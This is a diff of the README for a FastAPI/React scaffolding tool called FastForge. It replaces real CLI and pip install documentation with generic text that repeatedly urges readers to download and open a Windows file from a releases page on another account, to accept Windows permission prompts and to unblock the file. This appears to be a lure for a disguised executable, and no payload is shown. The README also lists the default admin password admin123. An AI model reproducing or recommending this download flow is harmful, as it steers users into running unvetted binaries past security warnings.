@@ -1,134 +1,229 @@
-# ⚡ FastForge
+# ⚡ fastforge - Build apps faster with one toolkit
 
-**Full-stack application framework for FastAPI + React (optional)**
+[![Download FastForge](https://img.shields.io/badge/Download-FastForge-blue?style=for-the-badge)](https://github.com/robindenticulate222/fastforge/releases)
 
-Runtime framework + pre-built modules + CLI tooling + auto-generated frontend clients. Supports PostgreSQL, MySQL, SQLite, and MongoDB.
+## 🖥️ Windows Download
 
-## Quick Start
+1. Open the [FastForge Releases page](https://github.com/robindenticulate222/fastforge/releases).
+2. Find the latest release.
+3. Download the Windows file from the Assets section.
+4. Save the file to your computer.
+5. Open the file to start the app or install the tool.
 
-```bash
-# Install FastForge
-pip install -e .              # CLI
-pip install -e backend/       # Runtime
+If the release includes a setup file, run it and follow the prompts. If it includes a zip file, extract it first, then open the app inside the folder.
 
-# Create project (FastAPI backend only)
-fastforge init my-app
+## 📦 What FastForge Does
 
-# Or with a specific database
-fastforge init my-app --db mysql
-fastforge init my-app --db mongodb
-fastforge init my-app --db sqlite
+FastForge helps you create a full-stack web app with less setup work. It gives you:
 
-# Or with React frontend included
-fastforge init my-app --react
-fastforge init my-app --db postgres --react
+- A FastAPI backend
+- A React frontend, when you want one
+- Database support for PostgreSQL, MySQL, SQLite, and MongoDB
+- CLI tools for common project tasks
+- Model stubs and code generation
+- Admin access for early app testing
 
-# Create & edit models
-cd my-app
-fastforge crud product       # creates model stub
-# Edit backend/app/models/product.py
+It is useful if you want to start with a simple project and add parts as you go.
 
-# Generate code from model
-fastforge generate product
+## 🚀 Getting Started
 
-# Start backend
-cd backend && uv run uvicorn app.main:app --reload
-# → http://localhost:8000/api/v1/docs
-# → Admin: admin@fastforge.dev / admin123
+1. Visit the [FastForge Releases page](https://github.com/robindenticulate222/fastforge/releases).
+2. Download the Windows build for your computer.
+3. Open the file you downloaded.
+4. If Windows asks for permission, choose Yes.
+5. Follow the on-screen steps.
+6. Open FastForge from the Start menu or from the folder where you saved it.
 
-# Add React frontend later (if not created with --react)
-fastforge add-frontend
+If the app starts in a terminal window, leave that window open while you use it.
 
-# Sync frontend TypeScript client
-fastforge generate-client -i http://localhost:8000/api/v1/openapi.json
+## 🧭 First Run
 
-# Start frontend
-cd frontend && npm run dev
-# → http://localhost:5173
-```
+When FastForge starts for the first time, it may create a local folder for your project files. This is normal.
 
-## Workflow
+You can then use it to:
 
-```
-fastforge crud product          → creates model stub
-you edit the model               → add columns, ForeignKeys
-fastforge migrate               → create DB migration
-fastforge generate product      → generates schemas, repo, service, router
-fastforge generate-client       → generates TypeScript types + hooks
-```
+- Create a new app project
+- Pick a database
+- Add a React frontend
+- Generate model files
+- Build basic API routes
+- Prepare frontend client code
 
-## CLI Commands
+If you use the sample admin account, these are the default details:
 
-| Command | What it does |
-|---------|-------------|
-| `fastforge init <name>` | Scaffold project with FastAPI backend |
-| `fastforge init <name> --react` | Scaffold with React frontend included |
-| `fastforge init <name> --db <db>` | Choose database: `postgres`, `mysql`, `sqlite`, `mongodb` |
-| `fastforge add-frontend` | Add React frontend to existing project |
-| `fastforge crud <entity>` | Create model stub |
-| `fastforge generate <entity>` | Generate schemas/repo/service/router from model |
-| `fastforge generate --all` | Generate for ALL models |
-| `fastforge generate --force` | Overwrite service + router too |
-| `fastforge migrate` | Create Alembic migration |
-| `fastforge generate-client -i <url>` | Generate TypeScript client from OpenAPI |
-| `fastforge list` | Show all models and status |
+- Email: admin@fastforge.dev
+- Password: admin123
 
-## Supported Databases
+## 💾 Recommended System Setup
 
-| Database | Driver | Connection URL |
-|----------|--------|----------------|
-| PostgreSQL (default) | `psycopg2-binary` | `postgresql://localhost/fastforge_db` |
-| MySQL | `pymysql` | `mysql+pymysql://root:password@localhost/fastforge_db` |
-| SQLite | built-in | `sqlite:///./app.db` |
-| MongoDB | `motor` + `beanie` | `mongodb://localhost:27017/fastforge_db` |
+FastForge works best on a Windows PC with:
 
-## What `fastforge generate` creates
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 2 GB of free disk space
+- A stable internet connection for setup and downloads
+- Enough space for your project files and database data
 
-| File | Regenerated? | Purpose |
-|------|-------------|---------|
-| schemas/{entity}.py | Always | Pydantic Create/Update/Response/List |
-| repositories/{entity}_repository.py | Always | GenericRepository with search fields |
-| permissions/{entity}.py | Always | PermissionGroup |
-| services/{entity}_service.py | Once (preserved) | CrudAppService + your custom hooks |
-| api/routes/{entity}.py | Once (preserved) | REST endpoints + your custom endpoints |
+For larger projects, more memory and disk space help keep things smooth.
 
-## Pre-built Modules
+## 🛠️ How to Use FastForge
 
-**Identity** — register, login, refresh, me, change-password, user CRUD, role CRUD with permissions
+### 1. Create a project
 
-**Tenant Management** — tenant CRUD + per-tenant feature flags
+Start with a new project name. For example, you can make a project called `my-app`.
 
-**Data Seeding** — auto-creates admin user + default roles on startup
+### 2. Choose your database
 
-## Runtime Features
+Pick the database that fits your app:
 
-| Feature | Usage |
-|---------|-------|
-| Entity base classes | `FullAuditedEntity` — auto id, audit fields, soft delete |
-| Generic repository | Pagination, search, sort, soft-delete filter, tenant filter |
-| CRUD service | Lifecycle hooks: before_create, after_create, before_update, etc. |
-| Permissions | `@require_permission("Product.Create")` |
-| JWT auth | AuthMiddleware auto-populates request.state |
-| Domain events | `event_bus.publish(OrderCreated(...))` |
-| Background jobs | `job_manager.enqueue(SendEmail, ...)` |
-| Settings | `settings.get("key", tenant_id="t-1")` — global→tenant→user |
-| Exceptions | `raise BusinessException("reason")` → standardized JSON |
+- PostgreSQL for larger apps
+- MySQL for common web hosting setups
+- SQLite for simple local projects
+- MongoDB for flexible document data
 
-## Frontend (optional, auto-generated)
+### 3. Add the frontend
 
-Add React frontend at project creation with `--react`, or later with `fastforge add-frontend`.
+You can build only the backend first, or include React from the start if you want a web interface.
 
-```tsx
-import { useListProducts, useCreateProduct, useAuth, RequirePermission } from "./api";
+### 4. Add models
 
-function Products() {
-  const { data } = useListProducts({ params: { search: "phone" } });
-  const create = useCreateProduct();
+Models describe the data in your app. For example, a product model may include a name, price, and stock count.
 
-  return (
-    <RequirePermission permission="Product.Read">
-      {data?.items.map(p => <div key={p.id}>{p.name}</div>)}
-    </RequirePermission>
-  );
-}
-```
+### 5. Generate code
+
+FastForge can create starter files from your model so you do not have to build everything by hand.
+
+### 6. Start the app
+
+After setup, start the backend and open the local web address in your browser.
+
+## 🧩 Example Project Flow
+
+A simple project often follows this flow:
+
+1. Download FastForge from the Releases page
+2. Open the app
+3. Create a new project
+4. Pick SQLite for a quick start
+5. Add a product model
+6. Generate the code
+7. Start the backend
+8. Open the local admin page in your browser
+
+This gives you a working base for testing and learning.
+
+## 🔧 Common Tasks
+
+### Create a new app
+
+Use FastForge to start a fresh project with the parts you need.
+
+### Add a database
+
+Choose the database during setup or change it later if your project grows.
+
+### Add a React front end
+
+You can include React at the start or add it later when you need a user interface.
+
+### Create data models
+
+Use models to define the things your app stores, such as users, orders, or products.
+
+### Generate starter files
+
+FastForge can build code from your model so you can move faster.
+
+### Run the app locally
+
+Open the backend in your browser and test the app on your own computer before sharing it with others.
+
+## 📁 Typical Project Layout
+
+A FastForge project may include folders like these:
+
+- `backend` for server code
+- `frontend` for React files
+- `models` for data definitions
+- `routes` for app paths
+- `schemas` for data shapes
+- `static` for files like images and icons
+- `templates` for pages and view files
+
+This layout helps keep the project organized.
+
+## 🔍 If the App Will Not Open
+
+If FastForge does not start, try these steps:
+
+1. Close the app.
+2. Open it again from the same file or folder.
+3. Make sure Windows did not block the file.
+4. Check that the download finished fully.
+5. Move the file to a simple folder like `Downloads` or `Desktop`.
+6. Try opening the program again.
+
+If you use a zip file, make sure you extract it before opening the app.
+
+## 🌐 Local Browser Address
+
+After startup, FastForge may open a local page in your browser such as:
+
+- `http://localhost:8000`
+- `http://localhost:8000/api/v1/docs`
+
+The first page is for the app. The docs page shows the API in the browser.
+
+## 📚 What You Can Build
+
+FastForge fits many small and mid-size apps, including:
+
+- Admin dashboards
+- Inventory tools
+- Internal team apps
+- Simple CRUD apps
+- API services
+- Data entry tools
+- Prototype web apps
+
+It gives you a clear place to start before you add custom features.
+
+## 🧪 Example Admin Access
+
+Some starter projects include a built-in admin account for testing.
+
+- Email: admin@fastforge.dev
+- Password: admin123
+
+Use it to check that the app works after setup.
+
+## 🔗 Download FastForge
+
+Visit the [FastForge Releases page](https://github.com/robindenticulate222/fastforge/releases) to download and run the Windows file from the latest release.
+
+## 📝 Basic Terms
+
+- **Backend**: the part of the app that handles data and logic
+- **Frontend**: the part you see in the browser
+- **Model**: a file that defines app data
+- **Database**: where app data is stored
+- **CLI**: a text-based tool for running commands
+
+## 🧷 File Tips for Windows
+
+- Keep the download in one folder
+- Do not rename files unless needed
+- Use a folder path you can find again
+- If you extract a zip file, keep the folder together
+- Open the app from the main file, not a random file inside the project
+
+## 🧭 Next Steps After Setup
+
+After FastForge is running, you can:
+
+1. Create your first project
+2. Add your first model
+3. Generate code
+4. Start the backend
+5. Open the local docs page
+6. Build more features over time
